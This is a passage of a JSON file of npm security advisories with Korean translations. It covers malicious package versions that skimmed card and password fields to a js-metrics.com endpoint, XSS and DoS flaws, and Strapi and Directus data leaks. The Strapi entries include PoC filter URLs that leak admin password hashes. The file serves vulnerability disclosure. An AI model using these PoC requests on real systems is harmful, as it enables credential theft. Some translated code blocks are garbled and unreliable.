    "descriptionKR": "'coffee-project' 버전 1.7.5에는 악성코드가 포함되어 있었습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 1.7.5가 설치된 것으로 확인되면 1.7.5 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 1.7.4로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.0.26 of `ngx-context-menu` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.0.25",
    "identifiers": "GHSA : GHSA-xwg3-gjxh-c8pm",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-26T23:59:01Z",
    "publishedAt": "2020-09-03T19:14:32Z",
    "references": "https://www.npmjs.com/advisories/1105\nhttps://github.com/advisories/GHSA-xwg3-gjxh-c8pm",
    "name": "ngx-context-menu",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.0.26",
    "descriptionKR": "`ngx-context-menu` 버전 0.0.26에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 버전 0.0.25로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "phpMyAdmin 4.0, 4.4., and 4.6 are vulnerable to a DOS attack in the replication status by using a specially crafted table name",
    "identifiers": "GHSA : GHSA-47qr-f86f-3wm4\nCVE : CVE-2017-1000018",
    "severity": "HIGH",
    "updatedAt": "2023-07-26T19:51:29Z",
    "publishedAt": "2022-05-14T01:18:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000018\nhttps://www.phpmyadmin.net/security/PMASA-2017-7\nhttps://web.archive.org/web/20210123220317/http://www.securityfocus.com/bid/95738\nhttps://github.com/advisories/GHSA-47qr-f86f-3wm4",
    "name": "phpmyadmin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0, <= 4.6",
    "descriptionKR": "phpMyAdmin 4.0, 4.4., 4.6은 특수하게 조작된 테이블 이름을 사용하여 복제 상태에서 DOS 공격에 취약"
  },
  {
    "description": "### Summary\n\nCWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nAccess to information you should not have access to when the permissions rely on `$CURRENT_USER` for filtering.\n\n### Details\n\nThe permission filters (i.e. `user_created IS $CURRENT_USER`) are not properly checked when using GraphQL subscription resulting in unauthorized users getting event on their subscription which they should not be receiving according to the permissions.\nThis can be any collection but out-of-the box the `directus_users` collection is configured with such a permissions filter allowing you to get updates for other users when changes happen.\n\nAn example:\n```graphql\nsubscription {\n  directus_users_mutated {\n    event\n    data {\n      id\n      last_access\n      last_page\n    }\n  }\n}\n```\n\n### Patches\nhttps://github.com/directus/directus/pull/19155\n\n### Workarounds\nDisable GraphQL Subscriptions\n\n### References\n\n",
    "identifiers": "GHSA : GHSA-gggm-66rh-pp98\nCVE : CVE-2023-38503",
    "severity": "MODERATE",
    "updatedAt": "2023-08-03T19:36:30Z",
    "publishedAt": "2023-07-25T23:31:10Z",
    "references": "https://github.com/directus/directus/security/advisories/GHSA-gggm-66rh-pp98\nhttps://github.com/directus/directus/pull/19155\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38503\nhttps://github.com/advisories/GHSA-gggm-66rh-pp98",
    "name": "directus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 10.3, < 10.5.0",
    "identifier": "10.5.0",
    "descriptionKR": "### 요약\n\nCWE-200: 승인되지 않은 행위자에게 민감한 정보 노출\n권한이 필터링을 위해 `$CURRENT_USER`에 의존할 때 액세스해서는 안 되는 정보에 대한 액세스.\n\n### 세부 정보\n\nGraphQL 구독을 사용할 때 권한 필터(예: `user_created IS $CURRENT_USER`)가 제대로 확인되지 않아 승인되지 않은 사용자가 권한에 따라 수신해서는 안 되는 구독 이벤트를 받게 됩니다.\n이것은 임의의 컬렉션일 수 있지만 기본적으로 `directus_users` 컬렉션은 이러한 권한 필터로 구성되어 변경이 발생할 때 다른 사용자에 대한 업데이트를 받을 수 있습니다.\n\n예:\n```graphql\n구독 {\n  directus_users_mutated {\n    이벤트\n    데이터 {\n      ID\n      last_access\n      마지막 페이지\n    }\n  }\n}\n```\n\n### 패치\nhttps://github.com/directus/directus/pull/19155\n\n### 해결 방법\nGraphQL 구독 비활성화\n\n### 참조"
  },
  {
    "description": "index.js in oauth2orize-fprm before 0.2.1 has XSS via a crafted URL.",
    "identifiers": "GHSA : GHSA-p77r-c6m3-gj2r\nCVE : CVE-2018-11647",
    "severity": "MODERATE",
    "updatedAt": "2023-07-25T21:30:51Z",
    "publishedAt": "2022-05-14T03:09:04Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-11647\nhttps://github.com/jaredhanson/oauth2orize-fprm/commit/2bf9faee787eb004abbdfb6f4cc2fb06653defd5\nhttps://github.com/jaredhanson/oauth2orize-fprm/blob/master/SECURITY-NOTICE.md\nhttps://github.com/advisories/GHSA-p77r-c6m3-gj2r",
    "name": "oauth2orize-fprm",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.1",
    "identifier": "0.2.1",
    "descriptionKR": "0.2.1 이전의 oauth2orize-fprm의 index.js에는 제작된 URL을 통한 XSS가 있습니다."
  },
  {
    "description": "Version 1.0.1 of `leaflet-gpx` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider a downgrade to version 1.0.0",
    "identifiers": "GHSA : GHSA-gjc9-932x-c59p",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-25T20:40:17Z",
    "publishedAt": "2020-09-03T00:34:33Z",
    "references": "https://www.npmjs.com/advisories/937\nhttps://github.com/advisories/GHSA-gjc9-932x-c59p",
    "name": "leaflet-gpx",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.1",
    "descriptionKR": "'leaflet-gpx' 버전 1.0.1에는 악성코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 1.0.0으로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.2.6 of `sailclothjs` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider a downgrade to 1.2.5",
    "identifiers": "GHSA : GHSA-m5pf-5894-jmx7",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-25T20:38:12Z",
    "publishedAt": "2020-09-03T19:08:00Z",
    "references": "https://www.npmjs.com/advisories/1099\nhttps://github.com/advisories/GHSA-m5pf-5894-jmx7",
    "name": "sailclothjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.2.6",
    "descriptionKR": "`sailclothjs` 버전 1.2.6에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 1.2.5로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.5 of `pyramid-proportion` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider a downgrade to version 1.0.4.",
    "identifiers": "GHSA : GHSA-v6vv-hhqc-6hh2",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-25T20:30:52Z",
    "publishedAt": "2020-09-03T19:15:37Z",
    "references": "https://www.npmjs.com/advisories/1106\nhttps://github.com/advisories/GHSA-v6vv-hhqc-6hh2",
    "name": "pyramid-proportion",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.5",
    "descriptionKR": "'피라미드 비율' 버전 1.0.5에는 악성코드가 포함되어 있다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 버전 1.0.4로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Imperavi Redactor 3 in Angular Redactor 1.1.6, when HTML content mode is used, allows stored XSS, as demonstrated by an onerror attribute of an IMG element, a related issue to CVE-2018-7035.",
    "identifiers": "GHSA : GHSA-88fh-8979-q2rr\nCVE : CVE-2018-13339",
    "severity": "MODERATE",
    "updatedAt": "2023-07-25T18:49:02Z",
    "publishedAt": "2022-05-14T03:04:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-13339\nhttps://github.com/TylerGarlick/angular-redactor/issues/77\nhttps://github.com/gleez/cms/issues/796\nhttps://github.com/advisories/GHSA-88fh-8979-q2rr",
    "name": "angular-redactor",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.1.6",
    "descriptionKR": "Angular Redactor 1.1.6의 Imperavi Redactor 3은 HTML 콘텐츠 모드를 사용할 때 저장된 XSS를 허용합니다. 이는 CVE-2018-7035와 관련된 문제인 IMG 요소의 onerror 속성에서 알 수 있습니다."
  },
  {
    "description": "### Impact\n\nPrivate messages or posts might be leaked to third parties if victim opens the attackers site while browsing nodebb.\n\n### Patches\n\n* Patched in v3.1.3\n* Backported to v2.x line via v2.8.13\n\n### Workarounds\n\nUsers can cherry-pick https://github.com/NodeBB/NodeBB/commit/51096ad2345fb1d1380bec0a447113489ef6c359 if they are on v3.x\n\nIf you are running v2.x of NodeBB, you can cherry-pick a5d92da9ddac5607ab7f737520a66eaed6d3ddee followed by 62e162cf1e735e42462be1db9b4954b5a69accdf\n",
    "identifiers": "GHSA : GHSA-4qcv-qf38-5j3j\nCVE : CVE-2023-2850",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T19:26:31Z",
    "publishedAt": "2023-07-25T18:04:28Z",
    "references": "https://github.com/NodeBB/NodeBB/security/advisories/GHSA-4qcv-qf38-5j3j\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-2850\nhttps://github.com/NodeBB/NodeBB/commit/51096ad2345fb1d1380bec0a447113489ef6c359\nhttps://github.com/NodeBB/NodeBB/commit/62e162cf1e735e42462be1db9b4954b5a69accdf\nhttps://github.com/NodeBB/NodeBB/commit/a5d92da9ddac5607ab7f737520a66eaed6d3ddee\nhttps://github.com/NodeBB/NodeBB/releases/tag/v3.1.3\nhttps://github.com/advisories/GHSA-4qcv-qf38-5j3j",
    "name": "nodebb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.8.13",
    "identifier": "2.8.13",
    "descriptionKR": "### 영향\n\n피해자가 nodebb를 탐색하는 동안 공격자 사이트를 열면 비공개 메시지나 게시물이 제3자에게 유출될 수 있습니다.\n\n### 패치\n\n* v3.1.3에서 패치됨\n* v2.8.13을 통해 v2.x 라인으로 백포트됨\n\n### 해결 방법\n\n사용자는 v3.x에 있는 경우 https://github.com/NodeBB/NodeBB/commit/51096ad2345fb1d1380bec0a447113489ef6c359를 선택할 수 있습니다.\n\nNodeBB v2.x를 실행 중인 경우 a5d92da9ddac5607ab7f737520a66eaed6d3ddee를 선택하고 62e162cf1e735e42462be1db9b4954b5a69accdf를 선택할 수 있습니다."
  },
  {
    "description": "### Impact\n\nPrivate messages or posts might be leaked to third parties if victim opens the attackers site while browsing nodebb.\n\n### Patches\n\n* Patched in v3.1.3\n* Backported to v2.x line via v2.8.13\n\n### Workarounds\n\nUsers can cherry-pick https://github.com/NodeBB/NodeBB/commit/51096ad2345fb1d1380bec0a447113489ef6c359 if they are on v3.x\n\nIf you are running v2.x of NodeBB, you can cherry-pick a5d92da9ddac5607ab7f737520a66eaed6d3ddee followed by 62e162cf1e735e42462be1db9b4954b5a69accdf\n",
    "identifiers": "GHSA : GHSA-4qcv-qf38-5j3j\nCVE : CVE-2023-2850",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T19:26:31Z",
    "publishedAt": "2023-07-25T18:04:28Z",
    "references": "https://github.com/NodeBB/NodeBB/security/advisories/GHSA-4qcv-qf38-5j3j\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-2850\nhttps://github.com/NodeBB/NodeBB/commit/51096ad2345fb1d1380bec0a447113489ef6c359\nhttps://github.com/NodeBB/NodeBB/commit/62e162cf1e735e42462be1db9b4954b5a69accdf\nhttps://github.com/NodeBB/NodeBB/commit/a5d92da9ddac5607ab7f737520a66eaed6d3ddee\nhttps://github.com/NodeBB/NodeBB/releases/tag/v3.1.3\nhttps://github.com/advisories/GHSA-4qcv-qf38-5j3j",
    "name": "nodebb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.1.3",
    "identifier": "3.1.3",
    "descriptionKR": "### 영향\n\n피해자가 nodebb를 탐색하는 동안 공격자 사이트를 열면 비공개 메시지나 게시물이 제3자에게 유출될 수 있습니다.\n\n### 패치\n\n* v3.1.3에서 패치됨\n* v2.8.13을 통해 v2.x 라인으로 백포트됨\n\n### 해결 방법\n\n사용자는 v3.x에 있는 경우 https://github.com/NodeBB/NodeBB/commit/51096ad2345fb1d1380bec0a447113489ef6c359를 선택할 수 있습니다.\n\nNodeBB v2.x를 실행 중인 경우 a5d92da9ddac5607ab7f737520a66eaed6d3ddee를 선택하고 62e162cf1e735e42462be1db9b4954b5a69accdf를 선택할 수 있습니다."
  },
  {
    "description": "### Summary\nStill able to leak private fields if using the t(number) prefix \n\n### Details\nKnex query allows you to change there default prefix \n```SqliteError: select distinct `t0`.* from `pages` as `t0` left join `admin_users` as `t1` on `t0`.`updated_by_id` = `t1`.`id` where (`t1`.`password` = 1)```\nso if you change the prefix to the same as it was before or to an other table you want to query you query changes from password to t1.password password is protected by filtering protections but t1.password is not protected\n### PoC\n1 Create a contentType\n2 add to its options \"populateCreatorFields\"\n3 create 1 entity in your new content type\n4 in settings enable the find route in settings for the content type you created for public\n5 /api/(Your contenttype)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=a%24\nAnd now the api returns noting if you were to do\n/api/(Your contenttype)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=%24 it would return your entity\n\n### Impact\nYou can do filtering attacks on everything related to the object again including admin passwords and reset-tokens.",
    "identifiers": "GHSA : GHSA-9xg4-3qfm-9w8f\nCVE : CVE-2023-34235",
    "severity": "HIGH",
    "updatedAt": "2023-07-25T19:46:23Z",
    "publishedAt": "2023-07-25T17:17:37Z",
    "references": "https://github.com/strapi/strapi/security/advisories/GHSA-9xg4-3qfm-9w8f\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34235\nhttps://github.com/strapi/strapi/releases/tag/v4.10.8\nhttps://github.com/advisories/GHSA-9xg4-3qfm-9w8f",
    "name": "@strapi/utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.10.7",
    "identifier": "4.10.8",
    "descriptionKR": "### 요약\nt(숫자) 접두사를 사용하는 경우 여전히 개인 필드를 유출할 수 있습니다.\n\n### 세부 정보\nKnex 쿼리를 사용하면 기본 접두사를 변경할 수 있습니다.\n```SqliteError: `t0`으로 `pages`에서 고유 `t0`.*을 선택하고 `t0`에서 `admin_users`를 `t1`으로 결합합니다.`updated_by_id` = `t1`.`id` 여기서 (`t1` .`비밀번호` = 1)```\n따라서 접두사를 이전과 동일하게 변경하거나 쿼리하려는 다른 테이블로 변경하면 암호에서 t1.password로 변경 사항을 쿼리합니다. 암호는 필터링 보호로 보호되지만 t1.password는 보호되지 않습니다.\n### PoC\n1 콘텐츠 유형 생성\n2 \"populateCreatorFields\" 옵션에 추가\n3 새 콘텐츠 유형에 1개의 엔터티를 만듭니다.\n설정에서 4는 공개용으로 만든 콘텐츠 유형에 대한 설정에서 찾기 경로를 활성화합니다.\n5 /api/(콘텐츠 유형)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=a%24\n그리고 이제 API는 당신이 해야 할 일을 알려줍니다.\n/api/(Your contenttype)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=%24 엔티티를 반환합니다.\n\n### 영향\n관리자 암호 및 재설정 토큰을 포함하여 개체와 관련된 모든 항목에 대해 필터링 공격을 다시 수행할 수 있습니다."
  },
  {
    "description": "### Summary\nStill able to leak private fields if using the t(number) prefix \n\n### Details\nKnex query allows you to change there default prefix \n```SqliteError: select distinct `t0`.* from `pages` as `t0` left join `admin_users` as `t1` on `t0`.`updated_by_id` = `t1`.`id` where (`t1`.`password` = 1)```\nso if you change the prefix to the same as it was before or to an other table you want to query you query changes from password to t1.password password is protected by filtering protections but t1.password is not protected\n### PoC\n1 Create a contentType\n2 add to its options \"populateCreatorFields\"\n3 create 1 entity in your new content type\n4 in settings enable the find route in settings for the content type you created for public\n5 /api/(Your contenttype)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=a%24\nAnd now the api returns noting if you were to do\n/api/(Your contenttype)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=%24 it would return your entity\n\n### Impact\nYou can do filtering attacks on everything related to the object again including admin passwords and reset-tokens.",
    "identifiers": "GHSA : GHSA-9xg4-3qfm-9w8f\nCVE : CVE-2023-34235",
    "severity": "HIGH",
    "updatedAt": "2023-07-25T19:46:23Z",
    "publishedAt": "2023-07-25T17:17:37Z",
    "references": "https://github.com/strapi/strapi/security/advisories/GHSA-9xg4-3qfm-9w8f\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34235\nhttps://github.com/strapi/strapi/releases/tag/v4.10.8\nhttps://github.com/advisories/GHSA-9xg4-3qfm-9w8f",
    "name": "@strapi/database",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.10.7",
    "identifier": "4.10.8",
    "descriptionKR": "### 요약\nt(숫자) 접두사를 사용하는 경우 여전히 개인 필드를 유출할 수 있습니다.\n\n### 세부 정보\nKnex 쿼리를 사용하면 기본 접두사를 변경할 수 있습니다.\n```SqliteError: `t0`으로 `pages`에서 고유 `t0`.*을 선택하고 `t0`에서 `admin_users`를 `t1`으로 결합합니다.`updated_by_id` = `t1`.`id` 여기서 (`t1` .`비밀번호` = 1)```\n따라서 접두사를 이전과 동일하게 변경하거나 쿼리하려는 다른 테이블로 변경하면 암호에서 t1.password로 변경 사항을 쿼리합니다. 암호는 필터링 보호로 보호되지만 t1.password는 보호되지 않습니다.\n### PoC\n1 콘텐츠 유형 생성\n2 \"populateCreatorFields\" 옵션에 추가\n3 새 콘텐츠 유형에 1개의 엔터티를 만듭니다.\n설정에서 4는 공개용으로 만든 콘텐츠 유형에 대한 설정에서 찾기 경로를 활성화합니다.\n5 /api/(콘텐츠 유형)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=a%24\n그리고 이제 API는 당신이 해야 할 일을 알려줍니다.\n/api/(Your contenttype)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=%24 엔티티를 반환합니다.\n\n### 영향\n관리자 암호 및 재설정 토큰을 포함하여 개체와 관련된 모든 항목에 대해 필터링 공격을 다시 수행할 수 있습니다."
  },
  {
    "description": "### Summary\nAnyone (Strapi developers, users, plugins) can make every attribute of a Content-Type public without knowing it.\n\n### Details\nWhen dealing with content-types inside a Strapi instance, we can extend those using the appropriate container:\n```javascript\nstrapi.container.get('content-types').extend(contentTypeUID, (contentType) => newContentType);\n```\nThe vulnerability only affects the handling of content types by Strapi, not the actual content types themselves. Users can use plugins or modify their own content types without realizing that the `privateAttributes` getter is being removed, which can result in any attribute becoming public. This can lead to sensitive information being exposed or the entire system being taken control of by an attacker(having access to password hashes).\n\n### PoC\nExtend any content type on runtime (like in the bootstrap functions) and do a copy of the content-type object.\n```javascript\nstrapi.container.get('content-types').extend(contentTypeUID, (contentType) => {\n  const newCT = { ... contentType, attributes: { ...contentType.attributes, newAttr: {} } };\n  return newCT;\n});\n```\nThis will have as effect to remove the getter and as we rely on it in sanitization, every attributes will be considered as public.\n\n### Impact\nEveryone can be impacted. Depending on how people are using/extending content-types. If the users are mutating the content-type, they will not be affected.\n",
    "identifiers": "GHSA : GHSA-chmr-rg2f-9jmf\nCVE : CVE-2023-34093",
    "severity": "MODERATE",
    "updatedAt": "2023-07-25T17:17:21Z",
    "publishedAt": "2023-07-25T17:17:12Z",
    "references": "https://github.com/strapi/strapi/security/advisories/GHSA-chmr-rg2f-9jmf\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34093\nhttps://github.com/strapi/strapi/commit/2fa8f30371bfd1db44c15e5747860ee5789096de\nhttps://github.com/strapi/strapi/releases/tag/v4.10.8\nhttps://github.com/advisories/GHSA-chmr-rg2f-9jmf",
    "name": "@strapi/database",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.8",
    "identifier": "4.10.8",
    "descriptionKR": "### 요약\n누구나(Strapi 개발자, 사용자, 플러그인) Content-Type의 모든 속성을 모르고 공개할 수 있습니다.\n\n### 세부 정보\nStrapi 인스턴스 내부의 콘텐츠 유형을 처리할 때 적절한 컨테이너를 사용하여 콘텐츠 유형을 확장할 수 있습니다.\n```자바스크립트\nstrapi.container.get('콘텐츠 유형').extend(contentTypeUID, (contentType) => newContentType);\n```\n이 취약점은 실제 콘텐츠 유형 자체가 아닌 Strapi의 콘텐츠 유형 처리에만 영향을 미칩니다. 사용자는 'privateAttributes' getter가 제거되고 있다는 사실을 깨닫지 못한 채 플러그인을 사용하거나 자신의 콘텐츠 유형을 수정할 수 있으며, 이로 인해 모든 속성이 공개될 수 있습니다. 이로 인해 민감한 정보가 노출되거나 공격자가 전체 시스템을 제어할 수 있습니다(암호 해시에 액세스할 수 있음).\n\n### PoC\n런타임에 모든 콘텐츠 유형을 확장하고(부트스트랩 함수에서와 같이) 콘텐츠 유형 객체를 복사합니다.\n```자바스크립트\nstrapi.container.get('콘텐츠 유형').extend(contentTypeUID, (contentType) => {\n  const newCT = { ... contentType, 속성: { ...contentType.attributes, newAttr: {} } };\n  newCT를 반환합니다.\n});\n```\n이는 getter를 제거하는 효과가 있으며 위생 처리에 의존하므로 모든 속성이 공용으로 간주됩니다.\n\n### 영향\n누구나 영향을 받을 수 있습니다. 사람들이 콘텐츠 유형을 사용/확장하는 방법에 따라 다릅니다. 사용자가 콘텐츠 유형을 변경하는 경우 영향을 받지 않습니다."
  },
  {
    "description": "### Summary\nAnyone (Strapi developers, users, plugins) can make every attribute of a Content-Type public without knowing it.\n\n### Details\nWhen dealing with content-types inside a Strapi instance, we can extend those using the appropriate container:\n```javascript\nstrapi.container.get('content-types').extend(contentTypeUID, (contentType) => newContentType);\n```\nThe vulnerability only affects the handling of content types by Strapi, not the actual content types themselves. Users can use plugins or modify their own content types without realizing that the `privateAttributes` getter is being removed, which can result in any attribute becoming public. This can lead to sensitive information being exposed or the entire system being taken control of by an attacker(having access to password hashes).\n\n### PoC\nExtend any content type on runtime (like in the bootstrap functions) and do a copy of the content-type object.\n```javascript\nstrapi.container.get('content-types').extend(contentTypeUID, (contentType) => {\n  const newCT = { ... contentType, attributes: { ...contentType.attributes, newAttr: {} } };\n  return newCT;\n});\n```\nThis will have as effect to remove the getter and as we rely on it in sanitization, every attributes will be considered as public.\n\n### Impact\nEveryone can be impacted. Depending on how people are using/extending content-types. If the users are mutating the content-type, they will not be affected.\n",
    "identifiers": "GHSA : GHSA-chmr-rg2f-9jmf\nCVE : CVE-2023-34093",
    "severity": "MODERATE",
    "updatedAt": "2023-07-25T17:17:21Z",
    "publishedAt": "2023-07-25T17:17:12Z",
    "references": "https://github.com/strapi/strapi/security/advisories/GHSA-chmr-rg2f-9jmf\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34093\nhttps://github.com/strapi/strapi/commit/2fa8f30371bfd1db44c15e5747860ee5789096de\nhttps://github.com/strapi/strapi/releases/tag/v4.10.8\nhttps://github.com/advisories/GHSA-chmr-rg2f-9jmf",
    "name": "@strapi/utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.8",
    "identifier": "4.10.8",
    "descriptionKR": "### 요약\n누구나(Strapi 개발자, 사용자, 플러그인) Content-Type의 모든 속성을 모르고 공개할 수 있습니다.\n\n### 세부 정보\nStrapi 인스턴스 내부의 콘텐츠 유형을 처리할 때 적절한 컨테이너를 사용하여 콘텐츠 유형을 확장할 수 있습니다.\n```자바스크립트\nstrapi.container.get('콘텐츠 유형').extend(contentTypeUID, (contentType) => newContentType);\n```\n이 취약점은 실제 콘텐츠 유형 자체가 아닌 Strapi의 콘텐츠 유형 처리에만 영향을 미칩니다. 사용자는 'privateAttributes' getter가 제거되고 있다는 사실을 깨닫지 못한 채 플러그인을 사용하거나 자신의 콘텐츠 유형을 수정할 수 있으며, 이로 인해 모든 속성이 공개될 수 있습니다. 이로 인해 민감한 정보가 노출되거나 공격자가 전체 시스템을 제어할 수 있습니다(암호 해시에 액세스할 수 있음).\n\n### PoC\n런타임에 모든 콘텐츠 유형을 확장하고(부트스트랩 함수에서와 같이) 콘텐츠 유형 객체를 복사합니다.\n```자바스크립트\nstrapi.container.get('콘텐츠 유형').extend(contentTypeUID, (contentType) => {\n  const newCT = { ... contentType, 속성: { ...contentType.attributes, newAttr: {} } };\n  newCT를 반환합니다.\n});\n```\n이는 getter를 제거하는 효과가 있으며 위생 처리에 의존하므로 모든 속성이 공용으로 간주됩니다.\n\n### 영향\n누구나 영향을 받을 수 있습니다. 사람들이 콘텐츠 유형을 사용/확장하는 방법에 따라 다릅니다. 사용자가 콘텐츠 유형을 변경하는 경우 영향을 받지 않습니다."
  },
  {
    "description": "### Summary\nAnyone (Strapi developers, users, plugins) can make every attribute of a Content-Type public without knowing it.\n\n### Details\nWhen dealing with content-types inside a Strapi instance, we can extend those using the appropriate container:\n```javascript\nstrapi.container.get('content-types').extend(contentTypeUID, (contentType) => newContentType);\n```\nThe vulnerability only affects the handling of content types by Strapi, not the actual content types themselves. Users can use plugins or modify their own content types without realizing that the `privateAttributes` getter is being removed, which can result in any attribute becoming public. This can lead to sensitive information being exposed or the entire system being taken control of by an attacker(having access to password hashes).\n\n### PoC\nExtend any content type on runtime (like in the bootstrap functions) and do a copy of the content-type object.\n```javascript\nstrapi.container.get('content-types').extend(contentTypeUID, (contentType) => {\n  const newCT = { ... contentType, attributes: { ...contentType.attributes, newAttr: {} } };\n  return newCT;\n});\n```\nThis will have as effect to remove the getter and as we rely on it in sanitization, every attributes will be considered as public.\n\n### Impact\nEveryone can be impacted. Depending on how people are using/extending content-types. If the users are mutating the content-type, they will not be affected.\n",
    "identifiers": "GHSA : GHSA-chmr-rg2f-9jmf\nCVE : CVE-2023-34093",
    "severity": "MODERATE",
    "updatedAt": "2023-07-25T17:17:21Z",
    "publishedAt": "2023-07-25T17:17:12Z",
    "references": "https://github.com/strapi/strapi/security/advisories/GHSA-chmr-rg2f-9jmf\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34093\nhttps://github.com/strapi/strapi/commit/2fa8f30371bfd1db44c15e5747860ee5789096de\nhttps://github.com/strapi/strapi/releases/tag/v4.10.8\nhttps://github.com/advisories/GHSA-chmr-rg2f-9jmf",
    "name": "@strapi/strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.8",
    "identifier": "4.10.8",
